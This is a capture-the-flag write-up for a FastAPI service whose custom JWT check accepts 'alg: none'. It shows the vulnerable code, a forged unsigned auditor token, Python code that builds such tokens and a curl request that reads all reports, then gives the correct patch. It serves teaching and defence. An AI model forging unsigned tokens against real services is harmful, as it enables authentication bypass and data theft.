# Null Authority — writeup

## Summary

- Stack: Python, FastAPI and custom JWT validation.
- Vulnerability: authentication bypass.
- Root cause: the server trusts the token's `alg` header and explicitly accepts `alg: none`.
- Result: an attacker can grant themselves the `auditor` role without a signature.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-3/null-authority/jury/exploit.py).

## Authorization design

`POST /api/login` issues a normal HMAC-SHA256 JWT containing:

```json
{"sub":"username","role":"user"}
```

Users can create reports through `POST /api/reports` and list their own reports through `GET /api/reports`. `GET /api/audit` returns every report but requires the `auditor` role. The jury logs in as a random user and stores ten flags in separate reports.

## Vulnerable code

JWTs contain three Base64URL sections:

```text
base64url(header).base64url(payload).base64url(signature)
```

The server validates the algorithm like this:

```python
if header.get("alg") == "HS256":
    # calculate and compare the HMAC
elif header.get("alg") == "none":
    pass
else:
    raise ValueError("unsupported algorithm")
```

For `HS256`, the signature is checked. For `none`, validation does nothing and the server then trusts the attacker-controlled claims:

```python
if payload.get("role") not in {"user", "auditor"}:
    raise ValueError("bad claims")
return payload
```

This verifies that `auditor` is a recognized role, not that the server issued it.

## Forging a token

Use this header and payload:

```json
{"alg":"none","typ":"JWT"}
{"sub":"guest","role":"auditor"}
```

Leave the signature empty while retaining the final dot:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhdWRpdG9yIn0.
```

Compact Python generator:

```python
import base64
import json

def part(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = part({"alg": "none", "typ": "JWT"})
payload = part({"sub": "guest", "role": "auditor"})
token = f"{header}.{payload}."
```

Request the audit feed:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://127.0.0.1:8000/api/audit
```

Print report contents matching `[A-Z0-9]{32}`.

## Correct patch

The server must select the allowed algorithm:

```python
if header.get("alg") != "HS256":
    raise ValueError("unsupported algorithm")

expected = hmac.new(
    signing_key,
    f"{header_part}.{payload_part}".encode(),
    hashlib.sha256,
).digest()

if not hmac.compare_digest(expected, supplied):
    raise ValueError("bad signature")
```

When using a JWT library, pass an explicit allowlist such as `algorithms=["HS256"]`. Never derive the verification policy from an untrusted header.

The checker obtains a genuine HS256 token from `/api/login`, creates a report and reads it back. Rejecting `none` preserves this signed-token flow. Production systems should also validate claims such as `exp`, `iss` and `aud`, but those are outside the intended bug.

## Takeaway

Base64URL encoding provides no authenticity. Claims become trustworthy only after a signature has been verified using an algorithm selected by the server.
